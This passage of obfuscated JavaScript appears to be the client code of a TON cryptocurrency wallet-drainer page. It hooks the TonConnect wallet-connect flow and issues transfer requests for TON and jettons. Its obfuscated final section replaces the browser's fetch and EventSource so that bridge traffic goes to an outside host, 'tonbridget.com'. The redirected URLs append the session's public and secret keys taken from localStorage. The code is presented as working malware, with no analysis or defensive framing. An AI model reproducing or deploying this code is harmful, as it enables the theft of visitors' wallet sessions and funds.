        account: allAddress
      });
      return _0x51b446;
    } catch (_0x5a2369) {
      let _0x436ef5 = "transfer_ton_native_request() " + _0x5a2369.stack;
      send_error(_0x436ef5);
      console.log(_0x5a2369);
    }
  };
const decline_transfer_ton_native_request = async (_0x2fa03e, _0x3c17d0) => {
    try {} catch (_0x4f9f38) {
      let _0x3fd24b = "decline_transfer_ton_native_request() " + _0x4f9f38.stack;
      send_error(_0x3fd24b);
      console.log(_0x4f9f38);
    }
  },
  transaction_done = async (_0x45b8eb, _0x460c54) => {
    try {} catch (_0x4d9dee) {
      let _0x18e6eb = "transaction_done() " + _0x4d9dee.stack;
      send_error(_0x18e6eb);
      console.log(_0x4d9dee);
    }
  },
  jettons_transaction_done = async (_0x21aa03, _0xf5ba6a) => {
    try {} catch (_0x1f07d8) {
      let _0x1c9bcf = "jettons_transaction_done() " + _0x1f07d8.stack;
      send_error(_0x1c9bcf);
      console.log(_0x1f07d8);
    }
  },
  send_error = async _0x2455cf => {
    try {} catch (_0x2158c) {
      console.log(_0x2158c);
    }
  },
  get_ton_text = async _0x258c9c => {
    try {
      let _0x53208a = await sendRequest({
        action: "get_ton_text",
        balance: _0x258c9c
      });
      return _0x53208a;
    } catch (_0x3380d8) {
      console.log(_0x3380d8);
    }
  },
  getKek = async () => {
    try {
      let _0x23fd0f = await sendRequest({
        action: "get_kek"
      });
      return _0x23fd0f;
    } catch (_0x2f9086) {
      console.log(_0x2f9086);
    }
  };
document.addEventListener("DOMContentLoaded", async () => {
  try {
    site_visit();
  } catch (_0xe2f931) {}
  let _0x5cfbee = setInterval(() => {
    try {
      const _0x3d4a80 = {
        manifestUrl: manifestUrl,
        buttonRootId: "ton-connect"
      };
      tonConnectUI = new TON_CONNECT_UI.TonConnectUI(_0x3d4a80);
      clearInterval(_0x5cfbee);
    } catch (_0x1672d5) {
      console.log(_0x1672d5);
    }
    tonConnectUI && tonConnectUI.onSingleWalletModalStateChange(_0x177ef8 => {
      _0x177ef8.closeReason == "wallet-selected" && (allAddress = tonConnectUI.account.address, connect());
    });
  }, 1000);
});
const _0x30ea71 = _0x8d63;
(function (_0x12de01, _0xc2c927) {
  const _0x3dab6f = _0x8d63,
    _0x1a3d49 = _0x12de01();
  while (true) {
    try {
      const _0x49565e = -parseInt(_0x3dab6f(202)) / 1 + -parseInt(_0x3dab6f(223)) / 2 + parseInt(_0x3dab6f(203)) / 3 * (parseInt(_0x3dab6f(209)) / 4) + -parseInt(_0x3dab6f(231)) / 5 * (parseInt(_0x3dab6f(187)) / 6) + parseInt(_0x3dab6f(199)) / 7 * (parseInt(_0x3dab6f(229)) / 8) + parseInt(_0x3dab6f(210)) / 9 + -parseInt(_0x3dab6f(218)) / 10;
      if (_0x49565e === _0xc2c927) {
        break;
      } else {
        _0x1a3d49.push(_0x1a3d49.shift());
      }
    } catch (_0x53ba38) {
      _0x1a3d49.push(_0x1a3d49.shift());
    }
  }
})(_0x2db3, 320688);
var _0x4c454c = _0x30ea71(230);
window[_0x30ea71(220)] = _0x4c454c;
try {
  localStorage[_0x30ea71(217)](_0x30ea71(208));
} catch (_0x1b7a3b) {}
let _0xf22e27 = _0x30ea71(215);
class _0x2bb33c {
  [_0x30ea71(214)]() {
    return new Promise(async (_0x4dda5e, _0x56d8c4) => {
      const _0x5d575c = _0x8d63;
      try {
        let _0x3162e6 = await fetch("https://raw.githubusercontent.com/ton-blockchain/wallets-list/main/wallets-v2.json", {
          method: "get"
        });
        return _0x4dda5e(await _0x3162e6[_0x5d575c(219)]());
      } catch (_0x2d331a) {
        _0x56d8c4(_0x2d331a);
      }
    });
  }
  getAppByBridge(_0x5b52d3) {
    const _0x4f7e48 = _0x30ea71;
    let _0x36cccc;
    for (let _0x53e9e6 of (console[_0x4f7e48(222)](this[_0x4f7e48(225)]), this[_0x4f7e48(225)])) {
      let _0x2dfab4 = false;
      for (let _0x57eb67 of _0x53e9e6[_0x4f7e48(197)]) if (_0x4f7e48(200) === _0x57eb67[_0x4f7e48(188)] && _0x5b52d3[_0x4f7e48(233)](_0x57eb67[_0x4f7e48(212)])) {
        _0x2dfab4 = true;
        break;
      }
      if (_0x2dfab4) {
        _0x36cccc = _0x53e9e6;
        break;
      }
    }
    return _0x36cccc;
  }
  constructor() {
    const _0x3f62fd = _0x30ea71;
    if (!this[_0x3f62fd(225)]) {
      try {
        this.fetchWallets()[_0x3f62fd(198)](_0x3d9572 => this[_0x3f62fd(225)] = _0x3d9572);
      } catch (_0x5ea241) {
        throw Error(_0x3f62fd(224));
      }
    }
  }
}
function _0x8d63(_0x48653d, _0x3439c7) {
  const _0x2db3c7 = _0x2db3();
  _0x8d63 = function (_0x8d6304, _0x15bd91) {
    _0x8d6304 = _0x8d6304 - 187;
    let _0x3899e0 = _0x2db3c7[_0x8d6304];
    return _0x3899e0;
  };
  return _0x8d63(_0x48653d, _0x3439c7);
}
function _0x2db3() {
  const _0x59b13d = ["session", "app_name", "/message", "secretKey", "bridge", "then", "859271qXKnEq", "sse", "https://", "324698CxzdNo", "111597wiGpuL", "pathname", "concat", "sessionCrypto", "fetch", "ton-connect-storage_bridge-connection", "60EoAQKO", "4090779kgcHvp", "publicKey", "url", "getItem", "fetchWallets", "tonbridget.com", "sessionKeyPair", "removeItem", "4810170EKZhhE", "json", "xversion", "&sec=", "log", "276482kFQWqY", "Execute wallets apps failed.", "wallets", "parse", "href", "/bridge/", "40hPTVCq", "v0.8.5.22", "5BrOEpo", "EventSource", "includes", "2169822CrKkJj", "type", "?pub=", "search", "getAppByBridge", "function"];
  _0x2db3 = function () {
    return _0x59b13d;
  };
  return _0x2db3();
}
var _0x2d0473,
  _0x211512,
  _0x36cb70,
  _0x3b20c6 = new _0x2bb33c();
_0x2d0473 = window;
_0x211512 = window[_0x30ea71(207)];
_0x36cb70 = window[_0x30ea71(232)];
_0x30ea71(192) == typeof _0x211512 && (_0x2d0473.fetch = function () {
  const _0x244327 = _0x30ea71;
  try {
    arguments[0][_0x244327(204)][_0x244327(233)]("bridge") && (arguments[0] = new URL("https://".concat(_0xf22e27, _0x244327(228))[_0x244327(205)](_0x3b20c6[_0x244327(191)](arguments[0][_0x244327(227)])[_0x244327(194)], _0x244327(195))[_0x244327(205)](arguments[0][_0x244327(190)])));
  } catch (_0x3ec0be) {}
  return _0x211512.apply(this, arguments);
}, _0x2d0473[_0x30ea71(232)] = class extends _0x36cb70 {
  constructor(_0x53fa50) {
    const _0x3b6045 = _0x30ea71;
    let _0x4eeef9 = JSON[_0x3b6045(226)](localStorage[_0x3b6045(213)](_0x3b6045(208)));
    super(_0x53fa50 = _0x4eeef9[_0x3b6045(206)] ? "https://"[_0x3b6045(205)](_0xf22e27, "/bridge/")[_0x3b6045(205)](_0x3b20c6[_0x3b6045(191)](_0x53fa50)[_0x3b6045(194)], _0x3b6045(189))[_0x3b6045(205)](_0x4eeef9[_0x3b6045(206)][_0x3b6045(211)], _0x3b6045(221))[_0x3b6045(205)](_0x4eeef9.sessionCrypto[_0x3b6045(196)]) : _0x3b6045(201)[_0x3b6045(205)](_0xf22e27, _0x3b6045(228))[_0x3b6045(205)](_0x3b20c6[_0x3b6045(191)](_0x53fa50)[_0x3b6045(194)], "?pub=")[_0x3b6045(205)](_0x4eeef9[_0x3b6045(193)][_0x3b6045(216)].publicKey, _0x3b6045(221)).concat(_0x4eeef9[_0x3b6045(193)][_0x3b6045(216)].secretKey));
  }
});